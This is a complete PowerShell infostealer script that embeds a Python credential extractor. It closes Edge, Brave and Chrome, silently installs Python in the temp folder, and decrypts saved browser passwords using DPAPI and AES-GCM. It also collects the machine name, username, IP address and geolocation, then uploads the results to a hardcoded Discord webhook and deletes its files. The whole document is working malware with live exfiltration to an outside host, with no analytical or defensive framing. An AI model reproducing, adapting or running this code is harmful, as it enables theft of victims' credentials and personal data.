$wh="https://discord.com/api/webhooks/1467597897435582594/wbqYsXdKoKB124ig5QJCGBBb88kmkTUpEKGEq0A6oZ-81uZ0ecgtHM-D8Zq44U7uh_8W"

function Send-Discord {
    param([string]$m)
    try { curl.exe -X POST -H "Content-Type: application/json" -d "{`"content`":`"$m`"}" $wh 2>$null } catch {}
}

Send-Discord "🟢 START - $env:COMPUTERNAME"

Get-Process | Where-Object {$_.ProcessName -match "msedge|brave|chrome"} | Stop-Process -Force -EA 0
Start-Sleep 7

try {
    $pyPath="$env:TEMP\py"
    $needInstall=$false
    
    if(!(Test-Path "$pyPath\python.exe")) {
        $needInstall=$true
    } else {
        cd $pyPath
        $testLibs=.\python.exe -c "import pycryptodome,win32crypt,requests;print('OK')" 2>$null
        if($testLibs -ne "OK") { $needInstall=$true }
    }
    
    if($needInstall) {
        Send-Discord "📥 Installing Python..."
        Invoke-WebRequest "https://www.python.org/ftp/python/3.11.9/python-3.11.9-embed-amd64.zip" -OutFile "$env:TEMP\py.zip" -UseBasicParsing -TimeoutSec 30
        Expand-Archive "$env:TEMP\py.zip" $pyPath -Force
        (Get-Content "$pyPath\python311._pth") -replace '#import site','import site'|Out-File "$pyPath\python311._pth" -Encoding ascii
        Invoke-WebRequest "https://bootstrap.pypa.io/get-pip.py" -OutFile "$pyPath\gp.py" -UseBasicParsing
        cd $pyPath
        .\python.exe gp.py --no-warn-script-location 2>$null
        .\python.exe -m pip install pycryptodome pypiwin32 requests --quiet 2>$null
        Remove-Item "$env:TEMP\py.zip" -Force -EA 0
        Send-Discord "✅ Python installed"
    }
    
    cd $pyPath
    
    @'
import os,json,base64,sqlite3,shutil,win32crypt,socket,platform,getpass,datetime,time
from Crypto.Cipher import AES

WH = "https://discord.com/api/webhooks/1467597897435582594/wbqYsXdKoKB124ig5QJCGBBb88kmkTUpEKGEq0A6oZ-81uZ0ecgtHM-D8Zq44U7uh_8W"

def send(msg):
    try:
        import requests
        requests.post(WH, json={"content": msg}, timeout=5)
    except:
        pass

send("🐍 Python script started")

try:
    import requests
    ip=requests.get("https://api.ipify.org",timeout=3).text
    geo=requests.get(f"http://ip-api.com/json/{ip}",timeout=3).json()
    location=f"{geo['city']}, {geo['regionName']}, {geo['country']}"
    isp=geo.get('isp','N/A')
except:
    ip="N/A"
    location="N/A"
    isp="N/A"

import locale
language=locale.getdefaultlocale()[0] if locale.getdefaultlocale()[0] else "N/A"

def decrypt_password(enc_password, key):
    """Essaie plusieurs méthodes de déchiffrement"""
    
    # Méthode 1: Format v10/v11 standard (Chrome/Edge)
    try:
        nonce = enc_password[3:15]
        ciphertext = enc_password[15:-16]
        tag = enc_password[-16:]
        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        return cipher.decrypt_and_verify(ciphertext, tag).decode('utf-8', errors='ignore')
    except:
        pass
    
    # Méthode 2: DPAPI pur (ancien format)
    try:
        return win32crypt.CryptUnprotectData(enc_password, None, None, None, 0)[1].decode('utf-8', errors='ignore')
    except:
        pass
    
    # Méthode 3: Format Brave alternatif (skip prefix différent)
    try:
        # Brave peut avoir un offset différent
        nonce = enc_password[0:12]
        ciphertext = enc_password[12:-16]
        tag = enc_password[-16:]
        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        return cipher.decrypt_and_verify(ciphertext, tag).decode('utf-8', errors='ignore')
    except:
        pass
    
    # Méthode 4: Sans vérification MAC (moins sûr mais fonctionne parfois)
    try:
        nonce = enc_password[3:15]
        ciphertext = enc_password[15:-16]
        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        return cipher.decrypt(ciphertext).decode('utf-8', errors='ignore')
    except:
        pass
    
    # Méthode 5: Brave avec offset v10
    try:
        if enc_password[:3] == b'v10':
            nonce = enc_password[3:15]
            ciphertext = enc_password[15:]
            # Essayer sans tag
            cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
            return cipher.decrypt(ciphertext[:-16]).decode('utf-8', errors='ignore')
    except:
        pass
    
    return None

def decrypt_browser(db_path, state_path, browser_name):
    results = []
    errors = []
    
    send(f"🔍 Processing {browser_name}...")
    
    if not os.path.exists(db_path):
        msg = f"❌ {browser_name}: Login Data not found"
        send(msg)
        errors.append(msg)
        return results, errors
    
    if not os.path.exists(state_path):
        msg = f"❌ {browser_name}: Local State not found"
        send(msg)
        errors.append(msg)
        return results, errors
    
    try:
        with open(state_path, 'r', encoding='utf-8') as f:
            key_data = json.load(f)
        
        encrypted_key = base64.b64decode(key_data['os_crypt']['encrypted_key'])[5:]
        key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        
        send(f"✅ {browser_name}: Key extracted ({len(key)} bytes)")
        
        temp_db = f"temp_{browser_name}.db"
        for attempt in range(5):
            try:
                if os.path.exists(temp_db):
                    os.remove(temp_db)
                shutil.copy2(db_path, temp_db)
                time.sleep(1)
                break
            except Exception as e:
                if attempt == 4:
                    msg = f"❌ {browser_name}: Failed to copy DB - {str(e)}"
                    send(msg)
                    errors.append(msg)
                    return results, errors
                time.sleep(2)
        
        send(f"✅ {browser_name}: DB copied")
        
        conn = sqlite3.connect(temp_db, timeout=120)
        cursor = conn.cursor()
        
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins WHERE username_value != ''")
        rows = cursor.fetchall()
        
        send(f"📊 {browser_name}: Found {len(rows)} entries")
        
        decrypted_count = 0
        failed_count = 0
        
        for url, username, enc_password in rows:
            if not enc_password:
                continue
            
            password = decrypt_password(enc_password, key)
            
            if password:
                results.append(f"[{browser_name}] {url}\nUsername: {username}\nPassword: {password}\n")
                decrypted_count += 1
            else:
                failed_count += 1
        
        conn.close()
        os.remove(temp_db)
        
        msg = f"✅ {browser_name}: {decrypted_count} decrypted, {failed_count} failed"
        send(msg)
        
    except Exception as e:
        msg = f"❌ {browser_name}: FATAL ERROR - {str(e)}"
        send(msg)
        errors.append(msg)
    
    return results, errors

all_results = []
all_errors = []

# EDGE
edge_base = os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data")
edge_db = os.path.join(edge_base, "Default", "Login Data")
edge_state = os.path.join(edge_base, "Local State")
if os.path.exists(edge_db):
    r, e = decrypt_browser(edge_db, edge_state, "EDGE")
    all_results.extend(r)
    all_errors.extend(e)

# BRAVE
brave_base = os.path.expandvars(r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data")
brave_db = os.path.join(brave_base, "Default", "Login Data")
brave_state = os.path.join(brave_base, "Local State")
if os.path.exists(brave_db):
    r, e = decrypt_browser(brave_db, brave_state, "BRAVE")
    all_results.extend(r)
    all_errors.extend(e)

# CHROME
chrome_base = os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data")
chrome_db = os.path.join(chrome_base, "Default", "Login Data")
chrome_state = os.path.join(chrome_base, "Local State")
if os.path.exists(chrome_db):
    r, e = decrypt_browser(chrome_db, chrome_state, "CHROME")
    all_results.extend(r)
    all_errors.extend(e)

info = f"""{'='*60}
SYSTEM INFORMATION
{'='*60}
Date/Time: {datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
Computer Name: {platform.node()}
Username: {getpass.getuser()}
OS: {platform.system()} {platform.release()}
Version: {platform.version()}
Machine: {platform.machine()}
Processor: {platform.processor()}
Hostname: {socket.gethostname()}
Language: {language}
Public IP: {ip}
Location: {location}
ISP: {isp}

{'='*60}
TOTAL PASSWORDS: {len(all_results)}
{'='*60}

"""

if all_results:
    with open("passwords.txt", "w", encoding="utf-8") as f:
        f.write(info)
        f.write("\n".join(all_results))
    send(f"📤 Uploading {len(all_results)} passwords...")
    print("OK")
else:
    with open("passwords.txt", "w", encoding="utf-8") as f:
        f.write(info)
        f.write("No passwords found.\n")
    send("⚠️ No passwords found")
    print("OK")
'@ | Out-File "extractor.py" -Encoding UTF8
    
    Send-Discord "🚀 Running extractor..."
    $result = .\python.exe extractor.py 2>&1
    
    if ($result -match "OK") {
        curl.exe -F "file=@passwords.txt" $wh 2>$null
        Send-Discord "✅ COMPLETE"
        Remove-Item passwords.txt,extractor.py -Force -EA 0
    } else {
        Send-Discord "❌ Failed: $result"
    }
    
} catch {
    Send-Discord "❌ Error: $($_.Exception.Message)"
}

Send-Discord "🧹 DONE"
